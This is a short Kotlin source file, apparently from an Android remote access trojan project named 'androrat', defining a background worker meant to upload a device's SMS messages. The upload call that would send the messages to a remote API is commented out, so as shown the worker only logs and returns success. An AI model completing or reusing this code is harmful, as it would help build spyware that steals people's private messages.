package com.ierusalem.androrat.worker

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.ierusalem.androrat.utility.Constants

class UploadWorker(context: Context, workerParameters: WorkerParameters) :
    CoroutineWorker(context, workerParameters) {
    override suspend fun doWork(): Result {
        val messages = inputData.getString(Constants.UPLOAD_WORKER_ARGUMENT_NAME) ?: "Can not send sms!"
        Log.d("ahi3646_upload", "doWork: upload - messages")
//        val apiService = RetrofitInstance(applicationContext).api
//        return try {
//            val response = apiService.postMessages(SMSModel(messages))
//            if (response.isSuccessful) {
//                Log.d("ahi3646_view_model", "sendMessages: success - ${response.body()} ")
//                Result.success()
//            }else{
//                Log.d("ahi3646_view_model", "sendMessages: failure  - ${response.errorBody()}")
//                Result.failure()
//            }
//        } catch (e: Exception) {
//            Log.d("ahi3646_view_model", "sendMessages: exception ${e.localizedMessage} ")
//            Result.failure()
//        }
        return Result.success()
    }

}